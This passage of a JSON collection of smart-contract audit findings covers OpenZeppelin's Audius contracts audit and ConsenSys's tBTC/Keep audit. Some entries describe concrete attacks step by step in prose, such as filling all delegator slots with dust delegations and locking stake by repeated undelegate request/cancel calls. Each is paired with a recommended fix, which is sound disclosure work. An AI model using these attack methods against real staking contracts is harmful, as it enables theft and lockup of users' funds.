      "content": "Under some conditions, delegators may prevent service providers from deregistering endpoints. This can happen innocently or maliciously.\n\n\nConsider the case where a service provider has registered more than one endpoint and that the service provider has staked the minimum amount of stake. Suppose delegators have delegated to this service provider the maximum amount of stake.\n\n\nWhen the service provider attempts to deregister one of the endpoints, their call to the [`deregister` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L224) may fail [on line 300](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L300). This is because the [`_validateBalanceInternal` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L773) [requires that `_amount <= spDetails[_sp].maxAccountStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L780), which may not be true if enough stake has been delegated to the service provider.\n\n\nConsider adjusting the logic of the `deregister` function to handle the case where `Staking(stakingAddress).totalStakedFor(_sp) > maxAccountStake`.\n\n\n***Update:** Partially fixed in [pull request #570](https://github.com/AudiusProject/audius-protocol/pull/570). The fix may introduce new attack vectors to the codebase. For example, in the [`removeDelegator` function](https://github.com/AudiusProject/audius-protocol/blob/7328cbe3db1ae90c1cf4415768d9b33cb0294bb8/eth-contracts/contracts/DelegateManager.sol#L472) the stake of the delegator is unstaked instantly. This could allow a service provider to bypass a slashing process by using sybil delegators and then removing its delegated stake before the slash takes place. This will reduce the slashing punishment significantly. Consider modifying the `removeDelegator` function to set a timelock so the slashing mechanism cannot be bypassed in that way. Furthermore, allowing a service provider to call this function at anytime could introduce further incentive problems. To mitigate this, consider adding a requirement on the `removeDelegator` function so it can only be called if the sum of stakes for a service provider is bigger than `spDetails[_sp].maxAccountStake`.*\n\n\n***Update:** Fixed in [pull request #657](https://github.com/AudiusProject/audius-protocol/pull/657). The `removeDelegator` function now implements a timelock.*",
      "summary": "\nThis bug report discusses an issue where under certain conditions, delegators may prevent service providers from deregistering endpoints. This can happen innocently or maliciously. When a service provider attempts to deregister an endpoint, their call to the `deregister` function may fail due to the `_validateBalanceInternal` function requiring that `_amount <= spDetails[_sp].maxAccountStake`. This may not be true if enough stake has been delegated to the service provider. \n\nTo address this issue, the logic of the `deregister` function was adjusted to handle the case where `Staking(stakingAddress).totalStakedFor(_sp) > maxAccountStake` in pull request #570. However, this could introduce new attack vectors to the codebase, such as a service provider bypassing a slashing process by using sybil delegators and then removing its delegated stake before the slash takes place. To mitigate this, the `removeDelegator` function was modified to set a timelock in pull request #657, so the slashing mechanism cannot be bypassed in that way.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11312",
      "title": "[H01] A malicious delegator can prevent all other delegators from delegating",
      "impact": "HIGH",
      "content": "All the delegators for a given service provider are [stored in an array](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L43). These arrays [are iterated over](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L286) during various operations. In order to prevent these iterations from hitting the block gas limit, [a `maxDelegators` value](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L104) is set. Once a service provider gains this maximum number of delegators, no new delegators can delegate to that service provider. By default `maxDelegators = 175`.\n\n\nAdditionally, the code requires that the total number of tokens (over all service providers) delegated by an active delegator must be above [some `minDelegationAmount`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L106). This `minDelegationAmount` is not enforced *per service provider*, but over all service providers to which the delegator has delegated. Therefore it is possible for a delegator to delegate to `X` service providers using a total of `minDelegationAmount + 1e-18 * (X-1)` tokens — by delegating `minDelegationAmount` to the first service provider and delegating just `1e-18` tokens to the remaining `X-1` service providers.\n\n\nAs a result of these two facts, an attacker can fill up all the delegator slots for a given service provider, thereby preventing any honest delegators from delegating to that service provider. They can do this for all service providers on the platform, thereby preventing any delegators from delegating.\n\n\nThey can do this as follows: Suppose there are `N` service providers on the platform. The attacker can create `maxDelegators` many ethereum accounts, depositing `minDelegationAmount + 1e-18 * (N - 1)` tokens in each of them. Then, with each account, the attacker delegates `minDelegationAmount` tokens to one of the `N` service providers and `1e-18` tokens to the other `(N-1)` service providers. As a result, all delegator slots for all service providers will be filled, and no honest delegators will be able to delegate to any service provider.\n\n\nThis attack costs `maxDelegators * [minDelegationAmount + 1e-18 * (N - 1)]`, which is approximately 17,500 AUD (using default values and ignoring dust amounts). To put this in perspective, this attack costs about `1.3%` of one week’s worth of AUD rewards.\n\n\nConsider having the `minDelegationAmount` be applied per service provider, rather than over all service providers. This would prevent a service provider’s delegator slots from being filled by “dust delegators”.\n\n\n***Update**: Fixed in [pull request #552](https://github.com/AudiusProject/audius-protocol/pull/552/files).*",
      "summary": "\nThis bug report is about a vulnerability in the Audius protocol which can be exploited by an attacker to prevent any honest delegators from delegating to any service provider. The vulnerability exists because of two facts: 1) a `maxDelegators` value is set, which prevents any new delegators from delegating to a service provider once it reaches the maximum number of delegators, and 2) the code requires that the total number of tokens (over all service providers) delegated by an active delegator must be above some `minDelegationAmount`.\n\nThe attacker can take advantage of these two facts by creating `maxDelegators` many ethereum accounts, depositing `minDelegationAmount + 1e-18 * (N - 1)` tokens in each of them. Then, with each account, the attacker delegates `minDelegationAmount` tokens to one of the `N` service providers and `1e-18` tokens to the other `(N-1)` service providers. As a result, all delegator slots for all service providers will be filled, and no honest delegators will be able to delegate to any service provider.\n\nThe attack costs `maxDelegators * [minDelegationAmount + 1e-18 * (N - 1)]`, which is approximately 17,500 AUD (using default values and ignoring dust amounts). To put this in perspective, this attack costs about `1.3%` of one week’s worth of AUD rewards.\n\nThe bug was fixed in [pull request #552](https://github.com/AudiusProject/audius-protocol/pull/552/files). The fix involved having the `minDelegationAmount` be applied per service provider, rather than over all service providers, which prevents a service provider’s delegator slots from being filled by “dust delegators”.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11311",
      "title": "[C03] Proxy admin doesn’t entirely cede upgrade control to governance address",
      "impact": "HIGH",
      "content": "In the [`AudiusAdminUpgradeabilityProxy` contract](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/AudiusAdminUpgradeabilityProxy.sol#L11), the [inline documentation](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/AudiusAdminUpgradeabilityProxy.sol#L18-L19) states that the proxy admin cedes upgrades control to the governance address, which is achieved by [overloading the `upgradeTo` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/AudiusAdminUpgradeabilityProxy.sol#L41-L47) of the parent contracts.  \n\nHowever, the contract does not overload the `upgradeToAndCall` function from [the OpenZeppelin’s `BaseAdminUpgradeabilityProxy` contract](https://github.com/OpenZeppelin/openzeppelin-sdk/blob/v2.8.0/packages/lib/contracts/upgradeability/BaseAdminUpgradeabilityProxy.sol#L13), allowing the deployer admin to bypass the governance and control the upgrades.\n\n\nThis is dangerous, as it gives the admin’s private key holder the possibility to upgrade the whole protocol without a proper governance’s consent. Furthermore, if the private key gets leaked after the deployment, it will allow any third party to modify the Audius bytecode on-chain.\n\n\nConsider modifying the current implementation to discard the upgrade permissions given to the admin address. Also, consider inheriting from a lower-level abstraction rather than overwriting existing functionality from a higher-level one. Finally, consider validating that the implementation contract does not have a signature clash with the proxy.\n\n\n***Update**: Fixed in pull request [#657](https://github.com/AudiusProject/audius-protocol/pull/657).*",
      "summary": "\nThis bug report is about the AudiusAdminUpgradeabilityProxy contract, which is part of the Audius protocol. The inline documentation of the contract states that the proxy admin cedes upgrades control to the governance address. However, the contract does not overload the upgradeToAndCall function from the OpenZeppelin’s BaseAdminUpgradeabilityProxy contract, which gives the admin’s private key holder the possibility to upgrade the whole protocol without the governance’s consent. This is dangerous as it could allow any third party to modify the Audius bytecode on-chain if the private key is leaked. To fix this, the current implementation must be modified to discard upgrade permissions given to the admin address. Additionally, the implementation contract should inherit from a lower-level abstraction rather than overwriting existing functionality from a higher-level one, and validate that there is no signature clash with the proxy. The bug has been fixed in pull request #657.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11310",
      "title": "[C02] Updating or removing a service type causes critical accounting errors",
      "impact": "HIGH",
      "content": "Updating or removing a service type after a service provider has registered an endpoint of that type can result in critical accounting errors. These errors can have serious effects, including preventing service providers from deregistering endpoints and preventing delegators from undelegating their stake.\n\n\nWhen a service provider registers or deregisters an endpoint, the `ServiceProviderFactory` contract tracks the required bounds within which a service provider’s stake must remain. These bounds are tracked in a [`ServiceProviderDetails` struct](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L26-L33) in the `ServiceProviderFactory` contract, and are referred to as the [`minAccountStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L31) and [`maxAccountStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L32). These bounds are determined by the `minStake` and `maxStake` of the service type’s [`ServiceTypeStakeRequirements` struct](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L25-L28), which is tracked in the `ServiceTypeManager` contract.\n\n\nHowever, when governance updates the `minStake` or `maxStake` of an endpoint — either via the [`updateServiceType` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L123) or the [`removeServiceType` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L123) — the `minAccountStake` and `maxAccountStake` for a given service provider that has already registered an endpoint of that type are *not* automatically updated.\n\n\nThis can result in critical accounting errors. Here are two examples.\n\n\nExample 1. Increasing a service type’s `minStake` or `maxStake` can result in a service provider being unable to deregister an endpoint:\n\n\nSuppose a service provider registers exactly one endpoint. Then suppose governance increases either the `minStake` or `maxStake` for that service type. Then when the service provider attempts to deregister their endpoint, their call to the `deregister` function will revert [on line 287](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L287) or [on line 288](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L288) due to an underflow in `.sub`.\n\n\nExample 2. Decreasing a service type’s `minStake` can result in a delegator being unable to undelegate all of their stake:\n\n\nSuppose a service provider registers an endpoint, and suppose a delegator delegates to that service provider. Then suppose governance decreases the `minStake` for that service type — either via the [`updateServiceType` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L123) or the [`removeServiceType` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceTypeManager.sol#L123). Then when the service provider deregisters the endpoint, the `deregister` function sets the `minAccountStake` to a value greater than `0` [on line 287](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L287). This means that when the delegator tries to undelegate all of their stake, their call to the `undelegateStake` function will revert [on line 311](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L311), because the `validateAccountStakeBalance` function [calls the `_validateBalanceInternal` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L674), [which requires](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L776) that `amount` (which will be `0`) is at least `spDetails[_sp].minAccountStake` (which will be greater than `0`).\n\n\nConsider removing the ability for governance to upgrade or remove service types. Instead, consider indicating the version of the service type in the service type’s name (e.g.: `\"ServiceType1-v1\"`) and using a `bool` to flag whether the service type is still “active” and can be registered by service providers.\n\n\n***Update**: Fixed in [pull request #555](https://github.com/AudiusProject/audius-protocol/pull/555/files). The ability to update an existing service type was removed.*",
      "summary": "\nThis bug report is about a critical accounting error that can occur when a service provider registers or deregisters an endpoint. The `ServiceProviderFactory` contract tracks the bounds within which a service provider’s stake must remain, and these bounds are determined by the `minStake` and `maxStake` of the service type’s `ServiceTypeStakeRequirements` struct, which is tracked in the `ServiceTypeManager` contract. \n\nHowever, when governance updates the `minStake` or `maxStake` of an endpoint, the `minAccountStake` and `maxAccountStake` for a given service provider that has already registered an endpoint of that type are not automatically updated. This can lead to two different accounting errors. \n\nThe first example is that when a service provider attempts to deregister their endpoint, their call to the `deregister` function will revert due to an underflow in `.sub`. The second example is that when a delegator tries to undelegate all of their stake, their call to the `undelegateStake` function will revert due to a `minAccountStake` that is greater than `0`. \n\nThe solution proposed is to remove the ability for governance to upgrade or remove service types. Instead, indicate the version of the service type in the service type’s name and use a `bool` to flag whether the service type is still “active” and can be registered by service providers. This issue has since been fixed in pull request #555.",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "11309",
      "title": "[C01] A malicious delegator can permanently lock all stake and rewards for a victim service provider and all of its honest delegators",
      "impact": "HIGH",
      "content": "The [`DelegateManager.requestUndelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L183) increases the value of the [`spDelegateInfo[_target].totalLockedUpStake`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L213) variable. However, if this request is cancelled via the [`cancelUndelegateStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L222), the `spDelegateInfo[_target].totalLockedUpStake` variable is not decreased.\n\n\nThis means that a malicious delegator can delegate to a target service provider, and then call `requestUndelegateStake` and `cancelUndelegateStake` repeatedly, causing `spDelegateInfo[_target].totalLockedUpStake` to grow arbitrarily large.\n\n\nIf the attacker makes `spDelegateInfo[_target].totalLockedUpStake` larger than [`totalBalanceOutsideStaking`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L341), then the `claimRewards` function will always revert [on line 364 of `DelegateManager.sol`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L364) when called by the victim service provider. In this way, the malicious delegator can permanently prevent the service provider from ever claiming any of their rewards.\n\n\nThis has additional negative security consequences.\n\n\nFirst, since the victim service provider will not be able to claim their pending rewards, the [`_claimPending` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L763) will always return `true` after the end of the week in which the attack took place. This means that honest delegators who have delegated to the victim service provider will never be able to undelegate their stake because their calls to the `undelegateStake` function will revert [on line 252](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/DelegateManager.sol#L252).\n\n\nSecond, this also means that the victim service provider cannot successfully call the [`ServiceProviderFactory.requestDecreaseStake` function](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L364) because it will revert [on line 369 of `ServiceProviderFactory.sol`](https://github.com/AudiusProject/audius-protocol/blob/6f3b31562b9d4c43cef91af0a011986a2580fba2/eth-contracts/contracts/ServiceProviderFactory.sol#L369). So the victim service provider also has their stake permanently locked.\n\n\nConsider modifying the `cancelUndelegateStake` function so that it reduces the `spDelegateInfo[_target].totalLockedUpStake` variable by the pending `UndelegateStakeRequest` amount.\n\n\n***Update**: Fixed in [pull request #561](https://github.com/AudiusProject/audius-protocol/pull/561).*",
      "summary": "\nA bug has been identified in the Audius Protocol codebase, in which a malicious delegator can exploit the `DelegateManager.requestUndelegateStake` and `cancelUndelegateStake` functions to increase the value of the `spDelegateInfo[_target].totalLockedUpStake` variable. This can eventually cause the `totalBalanceOutsideStaking` to become less than the `spDelegateInfo[_target].totalLockedUpStake`, resulting in the `claimRewards` function to always revert. \n\nThe malicious delegator can also prevent honest delegators from being able to undelegate their stake, and the victim service provider from being able to claim their rewards or successfully call the `ServiceProviderFactory.requestDecreaseStake` function.\n\nThe bug has been fixed by modifying the `cancelUndelegateStake` function so that it reduces the `spDelegateInfo[_target].totalLockedUpStake` variable by the pending `UndelegateStakeRequest` amount, in a pull request (#561).",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "OpenZeppelin",
      "protocol_name": "Audius Contracts Audit",
      "source_link": "https://blog.openzeppelin.com/audius-contracts-audit/",
      "github_link": "",
      "tags": [],
      "finders": [
        "OpenZeppelin"
      ]
    },
    {
      "id": "13813",
      "title": "tbtc - Variable shadowing in TBTCDepositToken constructor ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#512](https://github.com/keep-network/tbtc/pull/512)\n\n\n#### Description\n\n\n`TBTCDepositToken` inherits from `DepositFactoryAuthority`, which has a single state variable, `_depositFactory`. This variable is shadowed in the `TBTCDepositToken` constructor.\n\n\n**tbtc/implementation/contracts/system/TBTCDepositToken.sol:L21-L26**\n\n\n\n```\nconstructor(address \\_depositFactory)\n    ERC721Metadata(\"tBTC Deopsit Token\", \"TDT\")\n    DepositFactoryAuthority(\\_depositFactory)\npublic {\n    // solium-disable-previous-line no-empty-blocks\n}\n\n```\n#### Recommendation\n\n\nRename the parameter or state variable.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13812",
      "title": "tbtc - Where possible, use constant rather than state variables ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#513](https://github.com/keep-network/tbtc/pull/513)\n\n\n#### Description\n\n\n`TBTCSystem` uses a state variable for `pausedDuration`, but this value is never changed.\n\n\n**tbtc/implementation/contracts/system/TBTCSystem.sol:L34**\n\n\n\n```\nuint256 pausedDuration = 10 days;\n\n```\n#### Recommendation\n\n\nConsider using the `constant` keyword.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13811",
      "title": "tbtc - Revert error string may be malformed  Pending",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis issue is being tracked as <https://github.com/keep-network/tbtc/issues/509>.\n\n\n#### Description\n\n\n`FundingScript` handles an error from a call to `VendingMachine` like so.\n\n\n**tbtc/implementation/contracts/scripts/FundingScript.sol:L46-L52**\n\n\n\n```\n// Call the VendingMachine.\n// We could explictly encode the call to vending machine, but this would\n// involve manually parsing \\_extraData and allocating variables.\n(bool success, bytes memory returnData) = address(vendingMachine).call(\n    \\_extraData\n);\nrequire(success, string(returnData));\n\n```\nOn a high-level revert, `returnData` will already include the typical “error selector”. As `FundingScript` propagates this error message, it will add another error selector, which may make it difficult to read the error message.\n\n\nThe same issue is present in `RedemptionScript`:\n\n\n**tbtc/implementation/contracts/scripts/RedemptionScript.sol:L47-L52**\n\n\n\n```\n(bool success, bytes memory returnData) = address(vendingMachine).call(\\_extraData);\n// By default, `address.call` will catch any revert messages.\n// Converting the `returnData` to a string will effectively forward any revert messages.\n// https://ethereum.stackexchange.com/questions/69133/forward-revert-message-from-low-level-solidity-call\n// TODO: there's some noisy couple bytes at the beginning of the converted string, maybe the ABI-coded length?\nrequire(success, string(returnData));\n\n```\n#### Recommendation\n\n\nRather than adding an assembly-level revert to the affected contracts, ensure nested error selectors are handled in external libraries.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13810",
      "title": "tbtc - Values may contain dirty lower-order bits  Pending",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis is being tracked as <https://github.com/keep-network/tbtc/issues/557>.\n\n\n#### Description\n\n\n`FundingScript` and `RedemptionScript` use `mload` to cast the first bytes of a byte array to `bytes4`. Because `mload` deals with 32-byte chunks, the resulting `bytes4` value may contain dirty lower-order bits.\n\n\n#### Examples\n\n\n`FundingScript.receiveApproval`:\n\n\n**tbtc/implementation/contracts/scripts/FundingScript.sol:L38-L44**\n\n\n\n```\n// Verify \\_extraData is a call to unqualifiedDepositToTbtc.\nbytes4 functionSignature;\nassembly { functionSignature := mload(add(\\_extraData, 0x20)) }\nrequire(\n    functionSignature == vendingMachine.unqualifiedDepositToTbtc.selector,\n    \"Bad \\_extraData signature. Call must be to unqualifiedDepositToTbtc.\"\n);\n\n```\n`RedemptionScript.receiveApproval`:\n\n\n**tbtc/implementation/contracts/scripts/RedemptionScript.sol:L39-L45**\n\n\n\n```\n// Verify \\_extraData is a call to tbtcToBtc.\nbytes4 functionSignature;\nassembly { functionSignature := mload(add(\\_extraData, 0x20)) }\nrequire(\n    functionSignature == vendingMachine.tbtcToBtc.selector,\n    \"Bad \\_extraData signature. Call must be to tbtcToBtc.\"\n);\n\n```\n#### Recommendation\n\n\nSolidity truncates these unneeded bytes in the subsequent comparison operations, so there is no action required. However, this is good to keep in mind if these values are ever used for anything outside of strict comparison.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13809",
      "title": "tbtc - Variable shadowing in DepositFactory ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#512](https://github.com/keep-network/tbtc/pull/512)\n\n\n#### Description\n\n\n`DepositFactory` inherits from `TBTCSystemAuthority`. Both contracts declare a state variable with the same name, `tbtcSystem`.\n\n\n**tbtc/implementation/contracts/proxy/DepositFactory.sol:L21**\n\n\n\n```\naddress public tbtcSystem;\n\n```\n#### Recommendation\n\n\nRemove the shadowed variable.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13808",
      "title": "tbtc - Where possible, a specific contract type should be used rather than address ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nThis issue has been addressed with <https://github.com/keep-network/tbtc/issues/507> and [keep-network/tbtc#542](https://github.com/keep-network/tbtc/pull/542).\n\n\n#### Description\n\n\nRather than storing `address`es and then casting to the known contract type, it’s better to use the best type available so the compiler can check for type safety.\n\n\n#### Examples\n\n\n`TBTCSystem.priceFeed` is of type `address`, but it could be type `IBTCETHPriceFeed` instead. Not only would this give a little more type safety when deploying new modules, but it would avoid repeated casts throughout the codebase of the form `IBTCETHPriceFeed(priceFeed)`, `IRelay(relay)`, `TBTCSystem()`, and others.\n\n\n**tbtc/implementation/contracts/deposit/DepositUtils.sol:L25-L37**\n\n\n\n```\nstruct Deposit {\n\n    // SET DURING CONSTRUCTION\n    address TBTCSystem;\n    address TBTCToken;\n    address TBTCDepositToken;\n    address FeeRebateToken;\n    address VendingMachine;\n    uint256 lotSizeSatoshis;\n    uint8 currentState;\n    uint256 signerFeeDivisor;\n    uint128 undercollateralizedThresholdPercent;\n    uint128 severelyUndercollateralizedThresholdPercent;\n\n```\n**tbtc/implementation/contracts/proxy/DepositFactory.sol:L16-L28**\n\n\n\n```\ncontract DepositFactory is CloneFactory, TBTCSystemAuthority{\n\n    // Holds the address of the deposit contract\n    // which will be used as a master contract for cloning.\n    address public masterDepositAddress;\n    address public tbtcSystem;\n    address public tbtcToken;\n    address public tbtcDepositToken;\n    address public feeRebateToken;\n    address public vendingMachine;\n    uint256 public keepThreshold;\n    uint256 public keepSize;\n\n\n```\n#### Remediation\n\n\nWhere possible, use more specific types instead of `address`. This goes for parameter types as well as state variable types.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13807",
      "title": "tbtc - Restrict access to fallback function in Deposit.sol ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [keep-network/tbtc#526](https://github.com/keep-network/tbtc/pull/526)\n\n\n#### Description\n\n\n`Deposit.sol` has an empty, `payable` fallback function. It is unused except when seizing signer bonds from `BondedECDSAKeep`.\n\n\n#### Recommendation\n\n\nSo that Ether is not accidentally sent to a `Deposit`, have the fallback revert if the sender is not the `BondedECDSAKeep`.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13806",
      "title": "bitcoin-spv - unnecessary type correction ✓ Addressed",
      "impact": "LOW",
      "content": "#### Resolution\n\n\n\nIssue addressed in [summa-tx/bitcoin-spv#126](https://github.com/summa-tx/bitcoin-spv/pull/126)\n\n\n#### Description\n\n\nThe type correction `encodePacked().toBytes32()` is not needed as `sha256` already returns `bytes32`.\n\n\n#### Examples\n\n\n**bitcoin-spv/solidity/contracts/BTCUtils.sol:L114-L117**\n\n\n\n```\nfunction hash256(bytes memory \\_b) internal pure returns (bytes32) {\n    return abi.encodePacked(sha256(abi.encodePacked(sha256(\\_b)))).toBytes32();\n}\n\n\n```\n#### Recommendation\n\n\nRefactor to `return sha256(abi.encodePacked(sha256(_b)));` to save gas.",
      "summary": "",
      "quality_score": 0,
      "rarity_score": 0,
      "report_date": {},
      "firm_name": "ConsenSys",
      "protocol_name": "Thesis - tBTC and Keep",
      "source_link": "https://consensys.net/diligence/audits/2020/02/thesis-tbtc-and-keep/",
      "github_link": "",
      "tags": [],
      "finders": [
        "Martin Ortner",
        "Alexander Wade"
      ]
    },
    {
      "id": "13805",
      "title": "bitcoin-spv - redundant functionality  Won't Fix",
      "impact": "LOW",
